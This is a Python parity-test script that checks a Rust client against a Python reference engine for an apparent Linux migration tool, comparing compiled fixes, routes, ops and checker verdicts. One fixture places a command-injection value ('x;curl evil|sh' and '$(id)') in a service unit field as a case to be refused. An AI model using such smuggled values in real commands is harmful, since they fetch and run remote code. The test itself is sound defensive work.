"""The Rust client and the Python engine must agree, byte for byte.

  cargo build --release --manifest-path client/Cargo.toml
  python3 -B client/parity.py client/target/release/wend

Compares, over the whole atlas: every fix's and route's content id; every fix compiled (its precondition as a test,
its pre and post steps); every hop of every route, with all its pinned fixes and with none (the commands and the
`after` cleanup); the prune step; one example of every op on every backend; every predicate shape; and the gate's
own broken cases (tools/test_check.py), which the Rust checker must refuse exactly where the Python one does; and the
sandbox's hostname prelude.

The Python side (tools/) is CI's judge and SPEC.md's reference implementation. A difference here is a bug in the
client, or a spec change (a new op, a new adapter value) the client hasn't caught up with yet.
"""
import copy
import io
import json
import os
import subprocess
import sys
import tempfile
from contextlib import redirect_stdout

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.dont_write_bytecode = True
sys.path.insert(0, os.path.join(ROOT, "tools"))
import backends  # noqa: E402
import check  # noqa: E402
import sandbox  # noqa: E402
import walk  # noqa: E402

adapters, fixes, routes, boxes, runs = check.load_all()
rel = lambda p: os.path.relpath(p, ROOT)  # noqa: E731

# hops of fixes made here, for harness steps no pinned fix exercises yet (adds: sorted, deduplicated, after the post
# steps, before the pm-option cleanup and verify)
_kv = {"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"tcp_wrappers": "NO"}}
_po = {"op": "pm-option", "option": "overwrite-conflicting-files"}
_fx = lambda fam, hop, adds, step: {"schema": "wend.fix/0", "family": fam, "hop": hop, "when": {"installed": "x"},
                                    "restores": [], "adds": adds, "meta": {"name": "t"},
                                    "post": [{"op": "install", "packages": adds or ["x"]}, step]}  # noqa: E731
SYNTH_HOPS = [
    ("el", "alma9", [_fx("el", "alma9", ["polkit", "NetworkManager"], _kv), _fx("el", "alma9", ["polkit"], _kv),
                     _fx("el", "alma9", [], _kv)]),
    ("debian", "squeeze", [_fx("debian", "squeeze", ["libstdc++", "Zeta", "apache"], _po)]),
]

# one example of every op, with every argument shape, per family
STEPS = [
    ("debian", "squeeze", {"op": "install", "packages": ["mysql-server-5.1", "libc6"]}),
    ("debian", "squeeze", {"op": "remove", "packages": ["a", "b"], "purge": True}),
    ("debian", "squeeze", {"op": "remove", "packages": ["a"], "purge": False}),
    ("debian", "squeeze", {"op": "repair"}),
    ("debian", "squeeze", {"op": "force-remove", "packages": ["a", "b"], "purge": False, "force": []}),
    ("debian", "trixie", {"op": "force-remove", "packages": ["a"], "purge": True,
                          "force": ["depends", "remove-essential"]}),
    ("debian", "jessie", {"op": "write-file", "path": "/etc/apache2/sites-available/x.conf",
                          "content": "<VirtualHost *:80>\n\tDocumentRoot \"/var/www\"\\x\n</VirtualHost>\n"}),
    ("debian", "buster", {"op": "pm-option", "option": "overwrite-conflicting-files"}),
    ("debian", "jessie", {"op": "apache.enable", "kind": "mod", "name": "php5"}),
    ("debian", "jessie", {"op": "apache.disable", "kind": "site", "name": "000-default"}),
    ("debian", "wheezy", {"op": "dpkg.reinstall", "packages": ["module-init-tools", "a"]}),
] + [("el", rel_, s) for rel_ in ("centos6", "centos7", "alma9", "alma10") for s in [
    {"op": "install", "packages": ["php", "php-mysqlnd"]},
    {"op": "remove", "packages": ["a", "b"], "purge": True},
    {"op": "repair"},
    {"op": "force-remove", "packages": ["a", "b"], "purge": True, "force": ["depends", "scripts"]},
    {"op": "force-remove", "packages": ["a"], "purge": False, "force": []},
    {"op": "write-file", "path": "/etc/my.cnf", "content": "[mysqld]\ndatadir=/var/lib/mysql\\n\n"},
    {"op": "rpm.swap-release", "remove": "centos-release", "install": "almalinux-release"},
    {"op": "rpm.drop-arch", "arches": ["i686", "i386"]},
    {"op": "rpm.adopt-rpmnew", "paths": ["/etc/my.cnf", "/etc/httpd/conf.d/*.conf"]},
    {"op": "rpm.set-aside-unowned", "paths": ["/etc/php.d/*.ini"]},
    {"op": "fs.layout", "layout": "usrmove"},
    {"op": "fs.layout", "layout": "run"},
    {"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen_ipv6": "NO", "listen": "YES"}},
    {"op": "kv.unset", "path": "/etc/my.cnf", "keys": ["old_passwords", "b"]},
    {"op": "mysql.set-password", "user": "app", "secret": "app-db"},
    {"op": "mysql.clean-shutdown"},
    {"op": "mysql.upgrade-data"},
    {"op": "ssh.generate-host-keys"},
    {"op": "httpd.drop-missing-modules"},
    {"op": "php.mysqli-report-off"},
    {"op": "service.record"},
    {"op": "service.enable", "unit": "mariadb", "like": ["mysqld", "mariadb"]},
    {"op": "net.ifcfg-to-keyfile"},
]] + [
    ("el", "centos6", {"op": "rpm.bootstrap", "release": "centos6"}),
    ("el", "alma9", {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": []}),
    ("el", "alma9", {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": ["a", "b"]}),
]

PREDS = [(fam, w) for fam in ("debian", "el") for w in [
    {"installed": "libdb4.2"},
    {"file": "/etc/mysql/my.cnf"},
    {"file-contains": {"path": "/etc/my.cnf", "text": "old_passwords=1"}},
    {"mysql-option": {"path": "/etc/my.cnf", "key": "datadir"}},
    {"mysql-option": {"path": "/etc/my.cnf", "key": "old-passwords", "value": "1"}},
    {"not": {"installed": "x"}},
    {"all": [{"installed": "a"}, {"any": [{"file": "/etc/a"}, {"not": {"file": "/etc/b"}}]}]},
]]


def gate_cases():
    """Run tools/test_check.py with the checker's entry points wrapped, recording every case it feeds them."""
    cases = []

    def wrap(kind, fn):
        def rec(doc, *a):
            errs = fn(doc, *a)
            if kind == "fix":
                ad, wh = a
            elif kind == "adapter":
                ad, wh = {}, a[0]
            else:
                ad, wh = a[1], a[2]
            fx = list(a[0].values()) if kind == "route" else []
            cases.append({"kind": kind, "doc": copy.deepcopy(doc), "adapters": copy.deepcopy(ad), "where": wh,
                          "fixes": copy.deepcopy(fx), "refused": bool(errs)})
            return errs
        return rec

    orig = check.check_fix, check.check_adapter, check.check_route
    check.check_fix, check.check_adapter, check.check_route = (wrap("fix", orig[0]), wrap("adapter", orig[1]),
                                                               wrap("route", orig[2]))
    try:
        with redirect_stdout(io.StringIO()):
            code = compile(open(os.path.join(ROOT, "tools/test_check.py")).read(), "test_check.py", "exec")
            try:
                exec(code, {"__name__": "test_check", "__file__": os.path.join(ROOT, "tools/test_check.py")})
            except SystemExit as e:
                if e.code:
                    raise RuntimeError("tools/test_check.py itself fails; fix that first")
    finally:
        check.check_fix, check.check_adapter, check.check_route = orig
    # the real atlas too: every fix and adapter must pass in both
    for p, d in fixes.items():
        cases.append({"kind": "fix", "doc": d, "adapters": adapters, "where": rel(p), "fixes": [], "refused": False})
    for fam, a in adapters.items():
        cases.append({"kind": "adapter", "doc": a, "adapters": {}, "where": f"adapters/{fam}.toml", "fixes": [],
                      "refused": False})
    by_id = {check.content_id(d): d for d in fixes.values()}
    for p, r in routes.items():
        cases.append({"kind": "route", "doc": r, "adapters": adapters, "where": rel(p), "fixes": list(by_id.values()),
                      "refused": False})
    return cases


def type_corpus():
    """Wrong-type and edge-case documents, beyond the gate's own cases. Python refuses many of these by crashing
    (which fails CI's schema job just the same). The rule here is one-sided: wherever Python refuses, Rust must
    refuse too. Rust may be stricter; those are listed, not failed."""
    out = []
    by_id = {check.content_id(d): d for d in fixes.values()}
    WH = "fixes/el/centos7/x.toml"

    def base():
        return {"schema": "wend.fix/0", "family": "el", "hop": "centos7", "when": {"installed": "vsftpd"},
                "restores": ["box:ftp"], "adds": [],
                "post": [{"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen": "YES"}}],
                "meta": {"name": "x"}}

    def fix(label, mut, ad=None):
        d = base()
        mut(d)
        out.append({"label": label, "kind": "fix", "doc": d, "adapters": ad or adapters, "where": WH, "fixes": []})

    def adapter(label, mut):
        a = copy.deepcopy(adapters["el"])
        mut(a)
        out.append({"label": label, "kind": "adapter", "doc": a, "adapters": {}, "where": "adapters/el.toml",
                    "fixes": []})
        loose = copy.deepcopy(adapters)
        loose["el"] = a
        # and a fix judged by that adapter alone: what check_fix does with it (the client checks both)
        out.append({"label": label + " (fix under it)", "kind": "fix", "doc": {**base(), "post": [
            {"op": "service.enable", "unit": "x;curl evil|sh", "like": ["$(id)"]}]}, "adapters": loose,
            "where": WH, "fixes": []})

    S = lambda **kw: (lambda d: d.update(**kw))  # noqa: E731
    P = lambda *steps: (lambda d: d.update(post=list(steps)))  # noqa: E731
    fix("baseline", lambda d: None)
    fix("pre is a table", S(pre={"op": "repair"}))
    fix("pre is a string", S(pre="zzz"))
    fix("restores mixed", S(restores=["bogus", 1]))
    fix("restores string", S(restores="abc"))
    fix("restores table", S(restores={"bogus": 1}))
    fix("adds float", S(adds=[1e-5]))
    fix("adds string", S(adds="NetworkManager"))
    fix("adds table", S(adds={"NetworkManager": 1}))
    fix("packages string", P({"op": "remove", "packages": "abc", "purge": True}))
    fix("purge string", P({"op": "remove", "packages": ["abc"], "purge": "no"}))
    fix("write-file content list", P({"op": "write-file", "path": "/etc/my.cnf", "content": ["x'"]}))
    fix("write-file content int", P({"op": "write-file", "path": "/etc/my.cnf", "content": 5}))
    fix("meta not table", S(meta="x"))
    fix("step not table", S(post=["x"]))
    fix("kv.set values list", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": ["listen"]}))
    fix("kv.unset keys string", P({"op": "kv.unset", "path": "/etc/my.cnf", "keys": "old_passwords"}))
    fix("enum int", P({"op": "fs.layout", "layout": 1}))
    fix("list min", P({"op": "rpm.drop-arch", "arches": []}))
    fix("transit reinstall str", lambda d: d.update(hop="alma9", post=[
        {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": "x"}]))
    fix("install no gate", lambda d: d.update(when={"not": {"installed": "x"}}, post=[
        {"op": "install", "packages": ["a"]}]))
    fix("install any gate", lambda d: d.update(when={"any": [{"installed": "a"}, {"all": [
        {"installed": "a"}, {"file": "/etc/x"}]}]}, post=[{"op": "install", "packages": ["a"]}]))
    fix("paths glob wider", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/conf.d/*"]}))
    fix("paths subdir", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/conf.d/a/b.conf"]}))
    fix("paths unicode", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/php.d/é.ini"]}))
    fix("pattern newline", P({"op": "service.enable", "unit": "a\n", "like": ["b"]}))
    fix("table key unicode", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen١": "YES"}}))
    fix("table value int", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen": 1}}))
    fix("file-contains extra key", S(when={"file-contains": {"path": "/etc/a", "text": "x", "y": "z"}}))
    fix("mysql-option int", S(when={"mysql-option": {"path": "/etc/a", "key": "x", "value": 1}}))
    fix("hop list", S(hop=["centos7"]))
    fix("hop is the first release", S(hop="centos5"))
    fix("op int", lambda d: d["post"][0].update(op=1))
    fix("pm-option on rpm", P({"op": "pm-option", "option": "x"}))
    fix("force string", P({"op": "force-remove", "packages": ["a"], "purge": True, "force": "depends"}))
    fix("force empty", P({"op": "force-remove", "packages": ["a"], "purge": True, "force": []}))
    fix("service.record in post", P({"op": "service.record"}))
    fix("write-file box secrets", P({"op": "write-file", "path": "/etc/wend/x", "content": "a"}))
    fix("write-file harness file", P({"op": "write-file", "path": "/etc/yum.conf", "content": "a"}))
    fix("when is a list", S(when=[{"installed": "a"}]))
    fix("all empty", S(when={"all": []}))
    fix("not of a list", S(when={"not": [{"installed": "a"}]}))
    fix("meta name unicode", S(meta={"name": "xı"}))
    fix("kv.set on a file with sections", P({"op": "kv.set", "path": "/etc/my.cnf", "values": {"old_passwords": "1"}}))
    adapter("baseline", lambda a: None)
    adapter("op without args", lambda a: a["ops"]["mysql.upgrade-data"].pop("args"))
    adapter("op args is a list", lambda a: a["ops"]["service.enable"].update(args=["unit", "like"]))
    adapter("op spec is a string", lambda a: a["ops"]["service.enable"]["args"].update(unit="x"))
    adapter("pattern not a string", lambda a: a["ops"]["service.enable"]["args"]["unit"].update(pattern=1))
    adapter("pattern that breaks out of anchors", lambda a: a["ops"]["service.enable"]["args"]["unit"].update(
        pattern="[a-z]+)|(?:.*"))
    adapter("harness_owned string", lambda a: a.update(harness_owned="/etc/x"))
    adapter("ops a list", lambda a: a.update(ops=["kv.set"]))
    adapter("pattern lookahead", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="(?=a)[a-z]+"))
    adapter("pattern posix class", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[[:alpha:]]+"))
    adapter("pattern %", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[a-z%]+"))
    adapter("pattern newline", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[a-z\\n]+"))
    adapter("may_skip string", lambda a: a.update(may_skip="centos6"))
    adapter("force string", lambda a: a.update(force="depends"))
    adapter("kv keys string", lambda a: a["kv"]["/etc/my.cnf"].update(keys="abc"))
    adapter("path spec not a list name", lambda a: a["ops"]["kv.set"]["args"]["path"].update(path=1))
    adapter("pm_options a list", lambda a: a.update(pm_options=["x"]))
    # routes, judged with the real fixes
    r0 = copy.deepcopy(next(d for d in routes.values() if d["family"] == "el"))
    for label, mut in [("baseline", lambda r: None),
                       ("prune_obsolete a string", lambda r: r.update(finish={"prune_obsolete": "yes"})),
                       ("finish a string", lambda r: r.update(finish="x")),
                       ("fixes a table", lambda r: r.update(fixes={"id": "x"})),
                       ("fix ref a string", lambda r: r.update(fixes=["x"])),
                       ("prune_obsolete true", lambda r: r.update(finish={"prune_obsolete": True})),
                       ("a fix under another name", lambda r: r["fixes"][0].update(name="other")),
                       ("a fix outside the route", lambda r: r.update(to="alma9", hops=["centos6", "centos7",
                                                                                         "alma9"])),
                       ("an unknown id", lambda r: r["fixes"][0].update(id="sha256:00")),
                       ("hops out of order", lambda r: r.update(hops=["centos7", "centos6", "alma9", "alma10"])),
                       ("from after to", lambda r: r.update(**{"from": "alma9"}))]:
        r = copy.deepcopy(r0)
        mut(r)
        out.append({"label": "route " + label, "kind": "route", "doc": r, "adapters": adapters,
                    "where": "routes/el/x.toml", "fixes": list(by_id.values())})
    for c in out:
        try:
            if c["kind"] == "fix":
                e = check.check_fix(c["doc"], c["adapters"], c["where"])
            elif c["kind"] == "adapter":
                e = check.check_adapter(c["doc"], c["where"])
            else:
                e = check.check_route(c["doc"], {check.content_id(f): f for f in c["fixes"]}, c["adapters"],
                                      c["where"])
            c["refused"] = bool(e)
            # what CI's id step does next: canonical JSON (a float or date here is refused by Python too)
            check.canonical(c["doc"]) if c["kind"] != "adapter" else None
            if c["kind"] != "adapter" and "Infinity" in json.dumps(c["doc"]):
                c["refused"] = True
        except Exception:
            c["refused"] = True
    return out


def hop_dump(route, hop, only):
    a = adapters[route["family"]]
    by_id = {check.content_id(d): d for d in fixes.values()}
    fs = [by_id[r["id"]] for r in route["fixes"] if by_id[r["id"]]["hop"] == hop]
    if only is not None:
        fs = [f for f in fs if f["meta"]["name"] in only]
    w = type("W", (), {})()  # the harness's own hop_cmds (tools/walk.py), on a walk with no box
    w.adapter = a
    cmds = walk.Walk.hop_cmds(w, hop, fs)
    v = w.vars
    return {"fixes": [f["meta"]["name"] for f in fs], "commands": cmds,
            "after": [backends.fill(c, v) for c in a["hop"].get("after", [])]}


def python_side(cases):
    out = {"ids": {rel(p): check.content_id(d) for p, d in list(fixes.items()) + list(routes.items())}}
    out["fixes"] = {}
    for p, d in fixes.items():
        a = adapters[d["family"]]
        out["fixes"][rel(p)] = {"when": backends.pred_sh(d["when"], a),
                                "pre": [check.compile_step(s, a, d["hop"]) for s in d.get("pre", [])],
                                "post": [check.compile_step(s, a, d["hop"]) for s in d.get("post", [])]}
    out["hops"] = {rel(p): {h: {"all": hop_dump(r, h, None), "none": hop_dump(r, h, [])} for h in r["hops"]}
                   for p, r in routes.items()}
    out["prune"] = {rel(p): check.compile_step({"op": "remove", "packages": ["foo", "bar.baz"], "purge": True},
                                               adapters[r["family"]], r["to"]) for p, r in routes.items()}
    out["steps"] = [check.compile_step(s, adapters[fam], r) for fam, r, s in STEPS]
    out["synth_hops"] = []
    for fam, hop, fs in SYNTH_HOPS:
        w = type("W", (), {})()
        w.adapter = adapters[fam]
        out["synth_hops"].append(walk.Walk.hop_cmds(w, hop, fs))
    out["preds"] = [backends.pred_sh(w, adapters[fam]) for fam, w in PREDS]
    out["cases"] = [c["refused"] for c in cases]
    return out


def diff(a, b, path="", out=None):
    out = [] if out is None else out
    if type(a) is not type(b):
        out.append(f"{path}: python {json.dumps(a)[:300]}\n{' ' * len(path)}  rust   {json.dumps(b)[:300]}")
    elif isinstance(a, dict):
        for k in sorted(set(a) | set(b)):
            if k not in a or k not in b:
                out.append(f"{path}.{k}: only in {'rust' if k not in a else 'python'}")
            else:
                diff(a[k], b[k], f"{path}.{k}", out)
    elif isinstance(a, list) and len(a) == len(b):
        for i, (x, y) in enumerate(zip(a, b)):
            diff(x, y, f"{path}[{i}]", out)
    elif a != b:
        if isinstance(a, str) and isinstance(b, str):
            i = next((i for i, (x, y) in enumerate(zip(a, b)) if x != y), min(len(a), len(b)))
            out.append(f"{path}: first difference at char {i}\n  python ...{a[max(0, i - 60):i + 60]!r}\n"
                       f"  rust   ...{b[max(0, i - 60):i + 60]!r}")
        else:
            out.append(f"{path}: python {json.dumps(a)[:300]}\n  rust   {json.dumps(b)[:300]}")
    return out


def main(binary):
    cases = gate_cases()
    corpus = type_corpus()
    py = python_side(cases)
    with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
        json.dump({"steps": [{"family": fam, "release": r, "step": s} for fam, r, s in STEPS],
                   "synth_hops": [{"family": fam, "hop": h, "fixes": fs} for fam, h, fs in SYNTH_HOPS],
                   "preds": [{"family": fam, "when": w} for fam, w in PREDS],
                   "cases": [{k: c[k] for k in ("kind", "doc", "adapters", "where", "fixes")}
                             for c in cases + corpus]}, f)
    try:
        p = subprocess.run([os.path.abspath(binary), "parity", f.name], cwd=ROOT, capture_output=True, text=True)
    finally:
        os.unlink(f.name)
    if p.returncode:
        sys.exit(f"the client failed:\n{p.stderr}")
    rs = json.loads(p.stdout)
    verdicts = [bool(e) for e in rs["cases"]]
    rs["cases"], rs_corpus = verdicts[:len(cases)], verdicts[len(cases):]
    errs = diff(py, rs)
    if sandbox.NAME_SELF.encode() not in open(binary, "rb").read():
        errs.append("the sandbox's hostname prelude (tools/sandbox.py NAME_SELF) is not in the client binary")
    stricter = []
    for c, b in zip(corpus, rs_corpus):
        if c["refused"] and not b:
            errs.append(f"type corpus, {c['kind']} \"{c['label']}\": python refuses, rust accepts")
        elif b and not c["refused"]:
            stricter.append(c["label"])
    for i, (c, a, b) in enumerate(zip(cases, py["cases"], rs["cases"])):
        if a != b:
            errs.append(f"case {i} ({c['kind']} {c['where']}): python {'refuses' if a else 'accepts'}, "
                        f"rust {'refuses' if b else 'accepts'}: {json.dumps(c['doc'])[:400]}")
    n_hops = sum(len(r["hops"]) for r in routes.values())
    print(f"compared {len(py['ids'])} ids, {len(fixes)} fixes, {n_hops} route hops (x2), {len(STEPS)} op examples, "
          f"{len(PREDS)} predicates, {len(cases)} checker cases "
          f"({sum(py['cases'])} refused), {len(corpus)} type cases ({sum(c['refused'] for c in corpus)} refused): " +
          ("identical" if not errs else f"{len(errs)} differences"))
    if stricter:
        print(f"rust refuses {len(stricter)} type cases python accepts (fine; tighten tools/check.py): " +
              "; ".join(stricter))
    for e in errs[:40]:
        print("DIFF", e)
    return 1 if errs else 0


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    sys.exit(main(sys.argv[1]))
